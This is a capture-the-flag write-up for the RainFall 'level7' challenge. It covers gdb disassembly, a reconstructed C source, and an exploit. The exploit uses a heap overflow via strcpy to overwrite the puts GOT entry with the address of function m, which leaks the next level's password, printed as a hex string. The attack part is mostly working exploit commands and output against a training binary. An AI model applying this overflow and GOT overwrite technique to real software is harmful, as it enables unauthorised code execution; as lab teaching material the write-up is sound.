## level7

The goal is to call `m` after `fgets`, so we need to overwrite `puts@GOT` with the address of `m`.

```console
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEE aaaabbbbccccddddeeee
~~
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Segmentation fault (core dumped)
```

```console
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
(gdb) b main
Breakpoint 1 at 0x8048524
(gdb) run
Starting program: /home/user/level7/level7 

Breakpoint 1, 0x08048524 in main ()
(gdb) disas
Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp
   0x08048522 <+1>:     mov    ebp,esp
=> 0x08048524 <+3>:     and    esp,0xfffffff0
   0x08048527 <+6>:     sub    esp,0x20
   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    edx,eax
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    edx,eax
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:   add    eax,0x4
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:   mov    edx,eax
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:   add    eax,0x8
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:   mov    edx,eax
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    edx,0x80486e9
   0x080485c7 <+166>:   mov    eax,0x80486eb
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    eax,0x0
   0x08048601 <+224>:   leave  
   0x08048602 <+225>:   ret    
End of assembler dump.
(gdb) i fun puts  
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
0xb7e911a0  _IO_fputs
0xb7e911a0  fputs
0xb7e927e0  _IO_puts
0xb7e927e0  puts
0xb7e96ee0  fputs_unlocked
0xb7f20750  putspent
0xb7f21fa0  putsgent
(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928
(gdb) x/6b 0x08048400
0x8048400 <puts@plt>:   0xff    0x25    0x28    0x99    0x04    0x08
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[68];

typedef struct item_t {
    int id;
    char* buf;
} item_t;

void m() {
    printf("%s - %d\n", c, (int)time(NULL));
    return;
}

int main(int argc, char** argv) {
    item_t* item1 = malloc(sizeof(item_t));
    item1->id = 1;
    item1->buf = malloc(8);

    item_t* item2 = malloc(sizeof(item_t));
    item2->id = 2;
    item2->buf = malloc(8);

    strcpy(item1->buf, argv[1]);
    strcpy(item2->buf, argv[2]);

    FILE* stream = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, stream);

    puts("~~");
    return 0;
}
```

       m = 0x80484f4
puts@got = 0x8049928

padding : item1->buf (8) + malloc header (8) + item2->id (4) = 20

```console
level7@RainFall:~$ ./level7 $(python -c 'print("w" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1765095212
```
